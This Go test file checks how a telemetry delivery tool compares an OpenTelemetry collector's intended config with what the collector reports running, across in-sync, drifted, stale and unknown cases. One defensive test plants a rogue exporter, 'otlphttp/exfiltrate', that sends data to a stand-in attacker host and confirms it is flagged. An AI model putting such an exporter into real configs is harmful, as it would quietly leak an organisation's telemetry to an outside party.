package delivery

import (
	"strings"
	"testing"

	"github.com/telecraft-dev/telecraft/internal/estate"
)

// intendedArtefact is a minimal rendered artefact: stamped with its commit,
// as the renderer emits it (ADR-0013).
const intendedArtefact = `receivers:
  otlp:
    protocols:
      grpc: {}
exporters:
  otlphttp/out:
    endpoint: https://gateway.internal:4318
service:
  pipelines:
    traces:
      receivers:
        - otlp
      exporters:
        - otlphttp/out
  telemetry:
    resource:
      telecraft.commit: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
`

// supervisedEffective is what the Supervisor reports back for it: the same
// config with the injected extensions.opamp at an ephemeral port, `opamp`
// appended to service.extensions — and cosmetic re-ordering and quoting,
// because reports never come back byte-identical (ADR-0005).
const supervisedEffective = `service:
  extensions:
    - opamp
  telemetry:
    resource:
      "telecraft.commit": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
  pipelines:
    traces:
      exporters: ["otlphttp/out"]
      receivers: ["otlp"]
extensions:
  opamp:
    server:
      ws:
        endpoint: ws://127.0.0.1:54321/v1/opamp
exporters:
  otlphttp/out:
    endpoint: "https://gateway.internal:4318"
receivers:
  otlp:
    protocols:
      grpc: {}
`

// gitEffective is the same running config reported without any Supervisor
// beside it — the git-delivered path (REQ-041).
const gitEffective = `service:
  telemetry:
    resource:
      telecraft.commit: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
  pipelines:
    traces:
      exporters: ["otlphttp/out"]
      receivers: ["otlp"]
exporters:
  otlphttp/out:
    endpoint: "https://gateway.internal:4318"
receivers:
  otlp:
    protocols:
      grpc: {}
`

func known(config string) Effective { return Effective{Known: true, Config: []byte(config)} }

func intended(artefact string) Intended { return Intended{Known: true, Artefact: []byte(artefact)} }

func compute(t *testing.T, path Path, in Intended, eff Effective, remote estate.DeliveryStatus) Status {
	t.Helper()
	st, err := Compute(path, path.Profile(), in, eff, remote)
	if err != nil {
		t.Fatalf("Compute: %v", err)
	}
	return st
}

// AC: a served collector shows the correct delivery state from its commit
// stamp plus normalised comparison — the Supervisor's injections and every
// cosmetic difference neutralised, the RemoteConfigStatus carried verbatim
// beside it.
func TestServedCollectorInSync(t *testing.T) {
	st := compute(t, PathServed, intended(intendedArtefact), known(supervisedEffective),
		estate.DeliveryStatus{Known: true, State: estate.DeliveryApplied})

	if st.Comparison != ComparisonInSync {
		t.Fatalf("comparison = %s (cause %q), want in_sync:\n%v", st.Comparison, st.Cause, st.Changes)
	}
	if st.Path != PathServed || st.Profile != "supervisor" {
		t.Errorf("path=%s profile=%s — the path and its profile are visible properties", st.Path, st.Profile)
	}
	if st.Remote.State != estate.DeliveryApplied {
		t.Errorf("remote = %s, want the verbatim APPLIED", st.Remote.State)
	}
	if st.IntendedCommit != st.EffectiveCommit || st.IntendedCommit == "" {
		t.Errorf("commit stamps %q vs %q — both sides carry the artefact's identity (ADR-0013)", st.IntendedCommit, st.EffectiveCommit)
	}
}

// AC: a hand-committed (GitOps) collector gets identical treatment — the
// same computation, parameterised only by path and profile — and its
// delivery path is visible. The absent RemoteConfigStatus reading is
// Known: false, never failure.
func TestGitCollectorGetsIdenticalTreatment(t *testing.T) {
	st := compute(t, PathGit, intended(intendedArtefact), known(gitEffective),
		estate.DeliveryStatus{Cause: "the git-delivered path carries no RemoteConfigStatus reporter"})

	if st.Comparison != ComparisonInSync {
		t.Fatalf("comparison = %s (cause %q), want in_sync:\n%v", st.Comparison, st.Cause, st.Changes)
	}
	if st.Path != PathGit || st.Profile != "exact" {
		t.Errorf("path=%s profile=%s, want the visible git path under the exact profile", st.Path, st.Profile)
	}
	if st.Remote.Known {
		t.Error("a path that cannot report RemoteConfigStatus must say Known: false")
	}
	if s := st.Summary(); strings.Contains(s, "FAILED") || !strings.Contains(s, "path=git") {
		t.Errorf("summary %q — can't-report must never look like failing, and the path must be visible", s)
	}
}

// The profile is load-bearing per path: the same supervisor-mutated report
// that is in sync on the served path reads as drift under the git path's
// exact profile — an injection nobody's allow-list covers is an extension
// the artefact never described (ADR-0054 §2).
func TestProfileIsLoadBearingPerPath(t *testing.T) {
	st := compute(t, PathGit, intended(intendedArtefact), known(supervisedEffective), estate.DeliveryStatus{})
	if st.Comparison != ComparisonDrifted {
		t.Fatalf("comparison = %s, want drifted — the exact profile must flag the injected extension", st.Comparison)
	}
	if len(st.Undescribed) != 1 || st.Undescribed[0].Path != "extensions.opamp" {
		t.Errorf("the injected extension is not named: %v", st.Undescribed)
	}
}

// The bug on issue #110: a served collector expands every component's
// defaults against a sparse authored artefact, and the cross read all 71
// of them as drift. A key the artefact never mentions is not drift,
// whatever the collector defaults it to (ADR-0054 §1).
func TestACollectorsOwnDefaultsAreNotDrift(t *testing.T) {
	defaulted := strings.Replace(supervisedEffective,
		"  otlphttp/out:\n    endpoint: \"https://gateway.internal:4318\"\n",
		"  otlphttp/out:\n    endpoint: \"https://gateway.internal:4318\"\n    timeout: 30s\n    max_idle_conns: 100\n    encoding: proto\n", 1)
	st := compute(t, PathServed, intended(intendedArtefact), known(defaulted),
		estate.DeliveryStatus{Known: true, State: estate.DeliveryApplied})
	if st.Comparison != ComparisonInSync {
		t.Fatalf("a collector running what it was sent reads as %s:\n%v", st.Comparison, st.Changes)
	}
}

// The trade's compensating check, at the grain the trade blinds the cross
// to: an exporter shipping to somewhere nobody rendered is reported, and
// reported apart from key-level drift so a reader can tell the two
// findings apart (ADR-0054 §2).
func TestAnExporterNobodyRenderedIsReportedApartFromKeyDrift(t *testing.T) {
	rogue := strings.Replace(supervisedEffective,
		"exporters:\n  otlphttp/out:",
		"exporters:\n  otlphttp/exfiltrate:\n    endpoint: \"https://collector.attacker.example:4318\"\n  otlphttp/out:", 1)
	st := compute(t, PathServed, intended(intendedArtefact), known(rogue),
		estate.DeliveryStatus{Known: true, State: estate.DeliveryApplied})
	if st.Comparison != ComparisonDrifted {
		t.Fatalf("an exporter the estate never described reads as %s", st.Comparison)
	}
	if len(st.Undescribed) != 1 || st.Undescribed[0].Path != "exporters.otlphttp/exfiltrate" {
		t.Errorf("the undescribed exporter is not named: %v", st.Undescribed)
	}
	if len(st.Changes) != 0 {
		t.Errorf("an undescribed component leaked into key-level drift: %v", st.Changes)
	}
	if s := st.Summary(); !strings.Contains(s, "undescribed=1") {
		t.Errorf("summary %q does not carry the structural finding", s)
	}
}

// A pipeline nobody rendered is the same finding one grain up — the case
// judging only asserted keys would otherwise go blind to entirely.
func TestAPipelineNobodyRenderedIsReported(t *testing.T) {
	extra := strings.Replace(supervisedEffective,
		"    traces:\n",
		"    logs/shadow:\n      receivers: [otlp]\n      exporters: [otlphttp/out]\n    traces:\n", 1)
	st := compute(t, PathServed, intended(intendedArtefact), known(extra),
		estate.DeliveryStatus{Known: true, State: estate.DeliveryApplied})
	if st.Comparison != ComparisonDrifted {
		t.Fatalf("a pipeline the estate never described reads as %s", st.Comparison)
	}
	if len(st.Undescribed) != 1 || st.Undescribed[0].Path != "service.pipelines.logs/shadow" {
		t.Errorf("the undescribed pipeline is not named: %v", st.Undescribed)
	}
}

// AC: a provider that cannot report a reading yields Known: false — and
// the comparison is unknown with a cause, never stale, drifted, or any
// failure look-alike (ADR-0004, ADR-0008).
func TestUnknownReadingsNeverLookLikeFailure(t *testing.T) {
	cases := map[string]struct {
		in  Intended
		eff Effective
	}{
		"no intended":  {Intended{Known: false, Cause: "no artefact rendered at this path"}, known(gitEffective)},
		"no effective": {intended(intendedArtefact), Effective{Known: false, Cause: "collector unreachable"}},
		"neither":      {Intended{Known: false}, Effective{Known: false}},
	}
	for name, tc := range cases {
		st := compute(t, PathGit, tc.in, tc.eff, estate.DeliveryStatus{Cause: "not reported"})
		if st.Comparison != ComparisonUnknown {
			t.Errorf("%s: comparison = %s, want unknown", name, st.Comparison)
		}
		if st.Cause == "" {
			t.Errorf("%s: an unknown comparison must carry its cause", name)
		}
		if len(st.Changes) != 0 {
			t.Errorf("%s: changes reported with nothing compared", name)
		}
	}
}

// Disagreeing configs with two different commit stamps are stale — the
// collector runs another commit, a delivery lag — while a disagreement
// without that explanation is drift, localised by layer 3 (ADR-0004,
// ADR-0005).
func TestStaleAndDriftedAreSplitByTheCommitStamps(t *testing.T) {
	older := strings.ReplaceAll(strings.ReplaceAll(gitEffective,
		"a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2", "f0e1d2c3b4a5f0e1d2c3b4a5f0e1d2c3b4a5f0e1"),
		"https://gateway.internal:4318", "https://old-gateway.internal:4318")
	st := compute(t, PathGit, intended(intendedArtefact), known(older), estate.DeliveryStatus{})
	if st.Comparison != ComparisonStale {
		t.Fatalf("comparison = %s, want stale for a different-commit disagreement", st.Comparison)
	}
	if st.IntendedCommit == st.EffectiveCommit {
		t.Error("stale must surface the two different stamps")
	}

	edited := strings.ReplaceAll(gitEffective, "https://gateway.internal:4318", "https://somewhere-else:4318")
	st = compute(t, PathGit, intended(intendedArtefact), known(edited), estate.DeliveryStatus{})
	if st.Comparison != ComparisonDrifted {
		t.Fatalf("comparison = %s, want drifted for a same-commit disagreement", st.Comparison)
	}
	if len(st.Changes) == 0 {
		t.Fatal("a drifted comparison must localise the drift (ADR-0005 layer 3)")
	}
	for _, c := range st.Changes {
		if !strings.HasPrefix(c.Path, "exporters.otlphttp/out.endpoint") {
			t.Errorf("layer-3 noise outside the edited path: %s", c)
		}
	}
}

// AC: cosmetic YAML differences never read as divergence — an effective
// config the normaliser refuses (duplicate keys, merge keys) is the other
// edge: it fails closed to unknown-with-cause, never to a silent in_sync
// and never to a failure look-alike.
func TestNormaliserRefusalFailsClosedToUnknown(t *testing.T) {
	dup := "receivers: {}\nreceivers: {}\n"
	st := compute(t, PathGit, intended(intendedArtefact), known(dup), estate.DeliveryStatus{})
	if st.Comparison != ComparisonUnknown {
		t.Fatalf("comparison = %s, want unknown for a refused config", st.Comparison)
	}
	if !strings.Contains(st.Cause, "duplicate map key") {
		t.Errorf("cause %q does not name the refusal", st.Cause)
	}
}

// The vocabulary is closed: an invented delivery state or path is a caller
// bug, reported as an error rather than judged (ADR-0004: RemoteConfigStatus
// verbatim, no invented delivery states).
func TestInventedVocabularyIsRefused(t *testing.T) {
	if _, err := Compute("sideloaded", PathGit.Profile(), intended(intendedArtefact), known(gitEffective), estate.DeliveryStatus{}); err == nil {
		t.Error("an unknown delivery path was accepted")
	}
	if _, err := Compute(PathGit, PathGit.Profile(), intended(intendedArtefact), known(gitEffective),
		estate.DeliveryStatus{Known: true, State: "SORT_OF_APPLIED"}); err == nil {
		t.Error("an invented delivery state was accepted")
	}
}
